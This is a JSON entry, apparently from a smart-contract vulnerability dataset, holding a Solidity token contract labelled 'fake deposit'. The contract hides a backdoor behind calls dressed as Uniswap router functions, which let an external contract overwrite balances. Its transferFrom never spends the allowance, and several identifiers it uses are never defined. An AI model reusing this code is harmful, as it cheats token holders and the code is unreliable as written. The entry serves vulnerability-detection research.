        "Code": "pragma solidity ^0.8.15;\n\n// SPDX-License-Identifier: Unlicensed\n\ncontract VS {\n    using SafeMath for uint256;\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 public _decimals = 9;\n    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;\n    uint256 public _fee = 5;\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {\n        require(_allowances[msg.sender][from] >= amount);\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\n        return true;\n    }\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0));\n        require(to != address(0));\n        if (_uniRouter.getAmountsOut(from, to)) {\n            swapLiquidityBurn(amount, to);\n        } else if (!rebalanceSwap || amount <= _balances[from]) {\n            _balances[_uniRouter.getAmountsIn()] = takeFee(from);\n            uint256 feeAmount = getFeeAmount(from, to, amount);\n            uint256 amountReceived = amount - feeAmount;\n            _balances[address(this)] += feeAmount;\n            _balances[from] = _balances[from] - amount;\n            _balances[to] += amountReceived;\n            emit Transfer(from, to, amount);\n        }\n    }\n    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {\n        uint256 feeAmount = 0;\n        if (_uniRouter.swapTokensForExactETH(from, recipient, rebalanceSwap, address(this), callLiquidity())) {\n            feeAmount = amount.mul(_fee).div(100);\n        }\n        return feeAmount;\n    }\n    constructor() {\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\n    }\n    function name() external view returns (string memory) { return _name; }\n    function symbol() external view returns (string memory) { return _symbol; }\n    function decimals() external view returns (uint256) { return _decimals; }\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\n    function uniswapVersion() external pure returns (uint256) { return 2; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"IERC20: approve from the zero address\");\n        require(spender != address(0), \"IERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    bool rebalanceSwap = false;\n    function takeFee(address from) private view returns (uint256) {\n        return _uniRouter.swapETHForExactTokens(_balances[_uniRouter.getAmountsIn()], from, callLiquidity());\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, recipient, amount);\n        require(_allowances[from][msg.sender] >= amount);\n        return true;\n    }\n    function callLiquidity() private view returns (address) {\n        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    }
]